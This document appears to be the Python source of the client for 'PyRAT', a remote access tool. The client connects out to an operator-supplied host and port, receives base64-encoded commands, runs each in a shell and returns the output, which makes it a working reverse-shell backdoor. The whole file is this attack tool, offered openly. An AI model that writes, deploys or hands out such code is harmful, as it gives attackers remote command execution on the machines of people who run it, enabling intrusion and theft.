#!/bin/python3
"""Client for PyRAT."""
import argparse
import socket
from time import sleep as sleep
from base64 import b64encode as b64e
from base64 import b64decode as b64d
import subprocess


parser = argparse.ArgumentParser(description='Establish a PyRAT client.')
# TODO:  lhost/lport will be for future support of bind shells
# parser.add_argument('--lhost',
#                      type=str,
#                      help='The IP address to listen on.  Default:  0.0.0.0',
#                      default='0.0.0.0')
# parser.add_argument('--lport',
#                      type=str,
#                      help='The port to listen on.  Default:  443',
#                      default='443')
parser.add_argument('rhost',
                     type=str,
                     help='The remote host IP address.')
parser.add_argument('rport',
                     type=str,
                     help='The remote port to connect to.')
parser.add_argument('-v',  
                     help='Verbose output.',
                     default=False,
                     action='store_true')


class Client():
    def __init__(self, rhost, rport, verbose):
        """Basic class initialization."""
        self.rhost = rhost
        self.rport = rport
        self.connected = False
        self.verbose = verbose

    def inst(self):
        """Create socket."""
        self.cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect_wait(self):
        """Connect and wait for commands from server."""
        try:
            if not self.connected:
                self.cs.connect((self.rhost, int(self.rport)))
                print("Connected.  Waiting for command...")
                self.connected = True
            msg_raw = self.cs.recv(6).strip()
            # A blank message below indicates a lost server connection.
            if msg_raw == b'':
                print("It seems like the server may have shutdown...")
                return False
            size = int(msg_raw.decode('UTF-8'))
            msg = b''
            for i in range(size): 
                msg += self.cs.recv(1)
            msg_decode = b64d(msg).decode('UTF-8')
            if self.verbose:
                print(msg_decode)
            if msg_decode == 'pyratkill':
                return False
            
            # Send response.
            response = bytes(self._execute_cmd(msg_decode), encoding='UTF-8')
            len_resp = bytes(str(len(response)).zfill(5), encoding='UTF-8')
            if self.verbose:
                print(len_resp + b'\n' + response)
            self.cs.send(len_resp + b'\n' + response)

        except ConnectionRefusedError:
            print('\nServer is not listening.  Try again.\n')
            return False
        except ConnectionResetError:
            return False
        except ValueError:
            print('\nCommand formatting is incorrect.\n')
            print('Received:  \n' + msg_raw.decode('UTF-8'))
            # Try to flush receiver by reading a lot of bytes.
            self.cs.recv(1024)  
        return True

    def _execute_cmd(self, cmd):
        """Do what the server says."""
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True)
            output = result.stdout.decode('UTF-8')
            if output == '':
                error = 'No errors'
            return output
        except Exception:
            print('The command did not execute correctly.')
            return 'pyraterror'

    def socket_kill(self):
        """Kill TCP connections."""
        try:
            self.cs.shutdown(socket.SHUT_RDWR)
            self.cs.close()
        except Exception:
            pass
        finally:
            print('\nBye.')


def main():
    """Connect to server and handle commands received."""
    try:
        args = parser.parse_args()
        client = Client(args.rhost, args.rport, args.v)
        client.inst()
        print("PyRAT client ready.")

        continue_ = True
        while continue_:  # Keep connected until a break.
            continue_ = client.connect_wait()
            sleep(1)
        client.socket_kill()
    except KeyboardInterrupt or BrokenPipeError:
        print('\nBye.')


if __name__ == '__main__':
        main()
